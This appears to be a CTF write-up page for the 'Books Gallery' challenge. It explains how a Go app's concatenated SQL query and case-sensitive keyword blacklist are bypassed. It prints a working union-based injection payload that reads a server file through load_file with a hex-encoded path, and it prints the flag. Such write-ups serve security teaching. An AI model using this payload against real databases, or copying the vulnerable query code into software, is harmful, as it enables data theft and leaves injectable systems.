@@ -1,0 +1,120 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="CTF writeups, digital forensics, and cyber security notes by k3ng."><meta name="generator" content="Astro v7.1.1"><meta property="og:title" content="Books Gallery | k3ng.xyz"><meta property="og:description" content="CTF writeups, digital forensics, and cyber security notes by k3ng."><meta property="og:type" content="website"><link rel="icon" type="image/jpeg" href="/favicon.jpg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet"><title>Books Gallery | k3ng.xyz</title><script>
+      const savedTheme = localStorage.getItem('theme');
+      const preferredTheme = matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+      document.documentElement.dataset.theme = savedTheme || preferredTheme;
+    </script><link rel="stylesheet" href="/_astro/BaseLayout.DZwBvaeU.css"></head><body><header class="site-header"><div class="header-inner"><a class="wordmark" href="/" aria-label="Home">k3ng</a><nav aria-label="Primary navigation"><a href="/blog">Blog</a><a href="/writeups" aria-current="page">Writeups</a><a href="/about">About</a></nav><button class="theme-toggle" type="button" aria-label="Toggle color theme"><span class="theme-light" aria-hidden="true">☼</span><span class="theme-dark" aria-hidden="true">☾</span></button></div></header><main class="article-shell has-toc"><article><header class="article-header"><p class="eyebrow">CTF Hology 7.0</p><h1>Books Gallery</h1><ul class="article-tags" aria-label="Article tags"><li>go</li><li>mysql</li><li>union-based-sql-injection</li><li>blacklist-bypass</li><li>load-file</li></ul></header><div class="prose"><h3 id="challenge-description">Challenge Description</h3>
+<p>Author : anakmamah</p>
+<p>Lately, Pak Vincent has enjoyed reading books, but when he tried to search for a specific book, he realized that a feature was missing. He wondered why it had disappeared, especially since he was about to use it to find the book he wanted to read.</p>
+<h3 id="flag">Flag</h3>
+<p><code>HOLOGY7{8uKu_@d41ah_J3nd3la_dUn1A_uW4W}</code></p>
+<hr>
+<h3 id="analysis">Analysis</h3>
+<p>We are given a full source-code of a website written in Go. Looking at the <code>docker-compose.yml</code> file, we can see that the flag is stored on the database container meaning that we could use an SQL injection to solve this challenge. And also, the database for this challenge is using MySQL, so that could be important later on.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="yaml"><code><span class="line"><span style="color:#8B949E"># snip</span></span>
+<span class="line"><span style="color:#7EE787">  db</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">    image</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">mysql:8.0</span></span>
+<span class="line"><span style="color:#7EE787">    container_name</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">books-galery-db</span></span>
+<span class="line"><span style="color:#7EE787">    restart</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">always</span></span>
+<span class="line"><span style="color:#7EE787">    environment</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">MYSQL_ROOT_PASSWORD=password</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">MYSQL_USER=user</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">MYSQL_PASSWORD=password</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">MYSQL_DATABASE=books_galery</span></span>
+<span class="line"><span style="color:#7EE787">    ports</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">"3306:3306"</span></span>
+<span class="line"><span style="color:#7EE787">    volumes</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">./flag.txt:/var/lib/mysql-files/flag.txt</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">./database/database.sql:/docker-entrypoint-initdb.d/database.sql</span></span>
+<span class="line"><span style="color:#8B949E"># snip</span></span></code></pre>
+<p>From the <code>ShowBooks</code> controller, we can see that the parameters are concatenated to the query meaning that we could inject SQL statements to it. But, there is a <code>SanitizeData</code> function that implement some sort of blacklisting.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="go"><code><span class="line"><span style="color:#8B949E">// snip</span></span>
+<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> ShowBooks</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">db</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">sql</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">DB</span><span style="color:#E6EDF3">) </span><span style="color:#FFA657">gin</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">HandlerFunc</span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#E6EDF3">		searchQuery </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> c.</span><span style="color:#D2A8FF">Query</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"query"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">		searchQuery </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> lib.</span><span style="color:#D2A8FF">SanitizeData</span><span style="color:#E6EDF3">(searchQuery)</span></span>
+<span class="line"><span style="color:#E6EDF3">		log.</span><span style="color:#D2A8FF">Printf</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"Search query: </span><span style="color:#FF7B72">%s</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">, searchQuery)</span></span>
+<span class="line"><span style="color:#E6EDF3">		</span></span>
+<span class="line"><span style="color:#FF7B72">		var</span><span style="color:#E6EDF3"> rows </span><span style="color:#FF7B72">*</span><span style="color:#FFA657">sql</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Rows</span></span>
+<span class="line"><span style="color:#FF7B72">		var</span><span style="color:#E6EDF3"> err </span><span style="color:#FF7B72">error</span></span>
+<span class="line"><span style="color:#FF7B72">		if</span><span style="color:#E6EDF3"> searchQuery </span><span style="color:#FF7B72">!=</span><span style="color:#A5D6FF"> ""</span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#E6EDF3">			query </span><span style="color:#FF7B72">:=</span><span style="color:#A5D6FF"> `</span></span>
+<span class="line"><span style="color:#A5D6FF">				SELECT b.book_id, b.title, b.author, b.img_path </span></span>
+<span class="line"><span style="color:#A5D6FF">				FROM books b </span></span>
+<span class="line"><span style="color:#A5D6FF">				JOIN genres g ON b.genre_id = g.genre_id </span></span>
+<span class="line"><span style="color:#A5D6FF">				WHERE b.title LIKE '%`</span><span style="color:#FF7B72"> +</span><span style="color:#E6EDF3"> searchQuery </span><span style="color:#FF7B72">+</span><span style="color:#A5D6FF"> `%' OR b.author LIKE '%`</span><span style="color:#FF7B72"> +</span><span style="color:#E6EDF3"> searchQuery </span><span style="color:#FF7B72">+</span><span style="color:#A5D6FF"> `%'`</span></span>
+<span class="line"><span style="color:#E6EDF3">			rows, err </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> db.</span><span style="color:#D2A8FF">Query</span><span style="color:#E6EDF3">(query)</span></span>
+<span class="line"><span style="color:#E6EDF3">		} </span><span style="color:#FF7B72">else</span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#E6EDF3">			query </span><span style="color:#FF7B72">:=</span><span style="color:#A5D6FF"> `SELECT b.book_id, b.title, b.author, b.img_path </span></span>
+<span class="line"><span style="color:#A5D6FF">			          FROM books b </span></span>
+<span class="line"><span style="color:#A5D6FF">			          JOIN genres g ON b.genre_id = g.genre_id`</span></span>
+<span class="line"><span style="color:#E6EDF3">			rows, err </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> db.</span><span style="color:#D2A8FF">Query</span><span style="color:#E6EDF3">(query)</span></span>
+<span class="line"><span style="color:#E6EDF3">		}</span></span>
+<span class="line"><span style="color:#8B949E">// snip</span></span></code></pre>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="go"><code><span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> SanitizeData</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">input</span><span style="color:#FF7B72"> string</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">string</span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#E6EDF3">	replacements </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> []</span><span style="color:#FF7B72">struct</span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#E6EDF3">		old </span><span style="color:#FF7B72">string</span></span>
+<span class="line"><span style="color:#E6EDF3">		new </span><span style="color:#FF7B72">string</span></span>
+<span class="line"><span style="color:#E6EDF3">	}{</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">".."</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"--"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"/*"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"HAVING"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"UNION"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"SUBSTRING"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"ASCII"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"SHA1"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"ROW_COUNT"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"SELECT"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"INSERT"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"CASE WHEN"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"INFORMATION_SCHEMA"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"FILE"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"DROP"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"RLIKE"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">" IF "</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">" OR "</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"CONCAT"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"WHERE"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"UPDATE"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"or 1"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"or 1=1"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"flag"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"txt"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"or true"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"="</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">""</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"+"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"-"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"</span><span style="color:#FF7B72">\\</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"x"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"=$"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"+$"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">		{</span><span style="color:#A5D6FF">"+$"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"=$"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">	}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">	input </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> strings.</span><span style="color:#D2A8FF">TrimSpace</span><span style="color:#E6EDF3">(input)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">	for</span><span style="color:#E6EDF3"> _, r </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> range</span><span style="color:#E6EDF3"> replacements {</span></span>
+<span class="line"><span style="color:#E6EDF3">		input </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> strings.</span><span style="color:#D2A8FF">ReplaceAll</span><span style="color:#E6EDF3">(input, r.old, r.new)</span></span>
+<span class="line"><span style="color:#E6EDF3">	}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">	return</span><span style="color:#E6EDF3"> input</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<p>One problem with the sanitization is that the replacement does not account for capitalization. Since SQL does not check for capitalization, the statement blacklists are useless. But, we still cannot use <code>flag</code> or <code>txt</code> as our input. Therefore, we can use encoding to bypass this blacklist.</p>
+<h3 id="solution">Solution</h3>
+<p>The payload is a basic union-based SQL injection but we will open the <code>flag.txt</code> file and output it on one of the rows.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>' union select 1,load_file(unhex('2f7661722f6c69622f6d7973716c2d66696c65732f666c61672e747874')),1,1 from users %23</span></span></code></pre>
+<p>Then we just use that as our <code>query</code> and the flag will be printed out!</p>
+<p><img src="/images/books_gallery/books_gallery_1.png" alt="Flag is shown after inputting payload"></p></div></article><aside class="toc" aria-label="On this page"><p>On this page</p><ol><li class="nested"><a href="#challenge-description">Challenge Description</a></li><li class="nested"><a href="#flag">Flag</a></li><li class="nested"><a href="#analysis">Analysis</a></li><li class="nested"><a href="#solution">Solution</a></li></ol></aside></main><footer class="site-footer"><div><span>k3ng.xyz</span><span class="footer-note">2026</span></div></footer><script>
+      document.querySelector('.theme-toggle')?.addEventListener('click', () => {
+        const theme = document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark';
+        const updateTheme = () => {
+          document.documentElement.dataset.theme = theme;
+          localStorage.setItem('theme', theme);
+        };
+
+        if (document.startViewTransition) {
+          document.startViewTransition(updateTheme);
+          return;
+        }
+
+        document.documentElement.classList.add('theme-transition');
+        updateTheme();
+        setTimeout(() => document.documentElement.classList.remove('theme-transition'), 650);
+      });
+    </script></body></html>
